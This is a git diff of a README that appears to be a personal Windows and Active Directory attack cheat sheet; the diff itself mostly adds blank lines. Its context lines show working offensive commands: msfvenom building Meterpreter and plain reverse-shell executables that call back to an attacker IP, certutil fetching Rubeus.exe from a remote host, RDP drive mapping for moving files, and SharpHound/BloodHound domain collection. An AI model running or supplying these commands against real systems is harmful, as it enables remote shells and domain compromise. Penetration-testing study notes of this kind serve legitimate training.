@@ -1,6 +1,9 @@
 # Windows-AD-attacking
 
-Anything about **Windows / Active Directory** will be posted here ..
+&nbsp;
+&nbsp;
+
+Anything about **Windows / Active Directory** will be posted here :D
 
 &nbsp;
 &nbsp;
@@ -15,8 +18,11 @@ Anything about **Windows / Active Directory** will be posted here ..
 
 ```
 // Meterpreter
+
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
+
 // TCP
+
 msfvenom -p  windows/shell/reverse_tcp LHOST=192.168.119.126 LPORT=443 -f exe > reverse.exe
 ```
 
@@ -45,9 +51,12 @@ certutil.exe -urlcache -f http://192.168.50.48/Rubeus.exe C:\users\hitman\Rubeus
 
 ```
 - In Kali linux
+
 mkdir /home/hitman/shared
 rdesktop -f 192.168.50.48 -r disk:linux=/home/hitman/shared
+
 - Now in Windows's RDP
+
 Go to Network Places -> Entire Network -> Microsoft Terminal Services -> tsclient
 and put your files there, you will find them in Kali too
 Note: You can access the share \\tsclient directly too
@@ -200,9 +209,11 @@ smbclient -L IP
 
 ```
 // EXE version
+
 ./SharpHound.exe --CollectionMethod All
 
 // Powershell version
+
 Invoke-BloodHound -CollectionMethod All
 ```
 
